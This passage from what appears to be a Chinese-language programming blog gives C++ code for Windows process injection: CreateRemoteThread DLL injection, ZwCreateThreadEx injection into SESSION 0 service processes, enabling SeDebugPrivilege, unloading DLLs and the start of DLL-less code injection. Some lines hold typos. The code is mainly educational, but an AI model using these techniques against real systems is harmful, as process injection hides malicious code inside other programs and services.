class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">    <span class="comment">// 申请内存</span></span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_CONMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpAddress == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把动态链接库写入到目标内存中</span></span><br><span class="line">    SIZE_T szWriteLength = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpAddress, szPath, ((<span class="built_in">wcslen</span>(szPath) + <span class="number">1</span>) * <span class="number">2</span>), &amp;szWrithLength);</span><br><span class="line">    <span class="comment">// 创建远程线程，把LoadLibrary作为回调函数，并且把刚才的地址作为参数进行调用</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 等待线程执行结束</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">    <span class="comment">// 清理、释放空间</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ZwCreateThreadEx-突破-SESSION-0-隔离的远程线程注入"><a href="#ZwCreateThreadEx-突破-SESSION-0-隔离的远程线程注入" class="headerlink" title="ZwCreateThreadEx 突破 SESSION 0 隔离的远程线程注入"></a>ZwCreateThreadEx 突破 SESSION 0 隔离的远程线程注入</h2><blockquote><p>与传统的<code>CreateRemoteThread</code>函数实现的远程线程注入DLL的唯一区别在于，突破<code>SESSION 0</code>远程线程注入是使用比<code>CreateRemoteThred</code>函数更为底层的<code>ZwCreateThreadEx</code>函数来创建远程线程。<code>ZwCreateThreadEx</code>函数可以突破<code>SESSION 0</code>隔离，将DLL成功注入到<code>SESSION 0</code>隔离的系统服务进程中。其中<code>ZwCreateThreadEx</code>在<code>ntdll.dll</code>中并没有声明，所以需要使用<code>GetProcAddress</code>从<code>ntdll.dll</code>中获取该函数的导出地址</p></blockquote><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p><strong>64位系统下函数声明</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ZwCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><p><strong>32位系统下函数声明</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ZwCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><h3 id="ZwCreateThreadEx-注入代码实现"><a href="#ZwCreateThreadEx-注入代码实现" class="headerlink" title="ZwCreateThreadEx 注入代码实现"></a>ZwCreateThreadEx 注入代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ZwCreateThreadExInjectDll</span><span class="params">(DWORD dwPid, <span class="type">char</span>* szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开进程句柄</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">    <span class="keyword">if</span>(hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在目标进程申请内存</span></span><br><span class="line">    DWORD dwSize = <span class="number">1</span> + <span class="built_in">lstrlen</span>(szDllPath);</span><br><span class="line">    LPVOID lpDllAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="comment">// 将数据写入目标进程</span></span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteProcessMemory</span>(hProcess, lpDllAddress, szDllPath, dwSize, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">        SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">        SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">        BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 获取ntdll.dll</span></span><br><span class="line">    HMODULE hNtDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(hNtDll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Load ntdll Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取LoadLibrary地址</span></span><br><span class="line">    FARPROC pFuncProcAddr = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(pFuncProcAddr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Get LoadLibrary Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取ZwCreateThreadEx地址</span></span><br><span class="line">    typedef_ZwCreateThreadEx zwCreateThreadEx = (typedef_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    HANDLE hRemoteThread = <span class="number">0</span>;</span><br><span class="line">    DWORD dwZwCreateThreadEx = <span class="built_in">zwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, lpDllAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(hRemoteThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;zwCreateThreadEx Failed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 关闭句柄</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, lpDllAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// OpenProcess打开高权限的进程需要提权</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnablePrivileges</span><span class="params">(HANDLE hProcess, <span class="type">const</span> <span class="type">char</span>* pszPrivilegesName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">    LUID luidValue = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 打开进程令牌并获取进程令牌句柄</span></span><br><span class="line">    bRet = ::<span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取本地系统的 pszPrivilegesName 特权的LUID值</span></span><br><span class="line">    bRet = ::<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, pszPrivilegesName, &amp;luidValue);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置提升权限信息</span></span><br><span class="line">    tokenPrivileges.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tokenPrivileges.Privileges[<span class="number">0</span>].Luid = luidValue;</span><br><span class="line">    tokenPrivileges.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="comment">// 提升进程令牌访问权限</span></span><br><span class="line">    bRet = ::<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tokenPrivileges, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 根据错误码判断是否特权都设置成功</span></span><br><span class="line">        dwRet = ::<span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">if</span> (ERROR_SUCCESS == dwRet) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SUCCESS!!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ERROR_NOT_ALL_ASSIGNED == dwRet) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR_NOT_ALL_ASSIGNED&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="built_in">EnablePrivileges</span>(hProcess, SE_DEBUG_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* szDllPath = <span class="string">&quot;C:\\Users\\dell\\OneDrive\\桌面\\Dll1.dll&quot;</span>;</span><br><span class="line">    <span class="built_in">ZwCreateThreadExInjectDll</span>(<span class="number">1364</span>, szDllPath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="卸载被注入的DLL文件"><a href="#卸载被注入的DLL文件" class="headerlink" title="卸载被注入的DLL文件"></a>卸载被注入的DLL文件</h2><h3 id="FreeLibrary-函数"><a href="#FreeLibrary-函数" class="headerlink" title="FreeLibrary 函数"></a>FreeLibrary 函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">FreeLibrary</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HMODULE hLibModule     <span class="comment">// dll 模块句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>FreeLibrary</strong></p><ul><li><code>FreeLibrary</code>函数使用的模块句柄可以通过前面介绍的<code>Module32First</code>和<code>Module32Next</code>两个函数获取，需要用到<code>MODULEENTRY32</code>结构体</li></ul></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagMODULEENTRY32</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD   dwSize;</span><br><span class="line">    DWORD   th32ModuleID;       <span class="comment">// This module</span></span><br><span class="line">    DWORD   th32ProcessID;      <span class="comment">// owning process</span></span><br><span class="line">    DWORD   GlblcntUsage;       <span class="comment">// Global usage count on the module</span></span><br><span class="line">    DWORD   ProccntUsage;       <span class="comment">// Module usage count in th32ProcessID&#x27;s context</span></span><br><span class="line">    BYTE  * modBaseAddr;        <span class="comment">// Base address of module in th32ProcessID&#x27;s context</span></span><br><span class="line">    DWORD   modBaseSize;        <span class="comment">// Size in bytes of module starting at modBaseAddr</span></span><br><span class="line">    HMODULE hModule;            <span class="comment">// The hModule of this module in th32ProcessID&#x27;s context</span></span><br><span class="line">    <span class="type">char</span>    szModule[MAX_MODULE_NAME32 + <span class="number">1</span>];</span><br><span class="line">    <span class="type">char</span>    szExePath[MAX_PATH];</span><br><span class="line">&#125; MODULEENTRY32;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>MODULEENTRY32</strong></p><ul><li><code>hModule</code>: 模块句柄</li><li><code>szModule</code>: 模块名称</li><li><code>szExePath</code>: 完整的模块的路径（包括路径和模块名称）</li></ul></div><h3 id="卸载DLL文件代码实现"><a href="#卸载DLL文件代码实现" class="headerlink" title="卸载DLL文件代码实现"></a>卸载DLL文件代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">UnInjectDll</span><span class="params">(DWORD dwPid, <span class="type">char</span>* szDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dwPid == <span class="number">0</span> || <span class="built_in">lstrlen</span>(szDllName) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拍摄进程快照，需要包含TlHelp32.h头文件</span></span><br><span class="line">    HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SANPMODULE, dwPid)</span><br><span class="line">    MODULEENTRY32 me32;</span><br><span class="line">    me32.dwSize = <span class="built_in">sizeof</span>(me32);</span><br><span class="line">    <span class="comment">// 查找匹配的模块名</span></span><br><span class="line">    BOOL bRet = <span class="built_in">Module32First</span>(hSnap, &amp;me32);</span><br><span class="line">    <span class="keyword">while</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">lstrcmp</span>(<span class="built_in">strupr</span>(me32.szExePath), <span class="built_in">strupr</span>(szDllName)) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = <span class="built_in">Module32Next</span>(hSnap, &amp;me32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnap);</span><br><span class="line">    <span class="comment">// 打开进程</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">    <span class="comment">// 获取FreeLibrary函数地址</span></span><br><span class="line">    FARPROC pFuncProcAddr = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line">    <span class="comment">// 卸载dll</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, me32.hModule, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="comment">// 关闭句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="无DLL的代码注入"><a href="#无DLL的代码注入" class="headerlink" title="无DLL的代码注入"></a>无DLL的代码注入</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> STRLEN = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_Data</span> &#123;</span><br><span class="line">    